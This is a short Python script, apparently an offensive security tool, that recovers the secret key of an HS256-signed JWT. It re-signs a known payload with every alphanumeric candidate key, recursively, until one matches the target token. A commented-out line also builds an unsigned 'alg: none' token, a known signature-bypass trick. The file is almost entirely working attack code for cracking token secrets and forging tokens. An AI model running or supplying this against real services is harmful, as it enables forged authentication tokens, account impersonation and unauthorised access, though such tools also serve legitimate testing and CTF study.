# Alternative: https://github.com/brendan-rius/c-jwt-cracker

import jwt
import base64
import string


def b64urlencode(data):
    return base64.b64encode(data.encode()).decode().replace('+', '-').replace('/', '_').replace('=', '')

#print(b64urlencode("{\"typ\":\"JWT\",\"alg\":\"none\"}") + '.' + b64urlencode("{\"data\":\"test\"}") + '.')

def test_key(payload, key, result):
    encoded = jwt.encode(payload, key, algorithm='HS256').decode()
    return encoded == result

def bruteforce_recursive(payload, result, key, depth, max_depth=10):
    if depth >= max_depth:
        return False
    
    for a in string.ascii_letters + string.digits:
        key_to_test = key + a
        print(key_to_test, end='\r')
        if test_key(payload, key_to_test, result):
            print(f"Key found! {key_to_test}")
            return True
    
    #time.sleep(1)

    for a in string.ascii_letters + string.digits:
        if bruteforce_recursive(payload, result, key + a, depth + 1, max_depth):
            return True
    
    return False
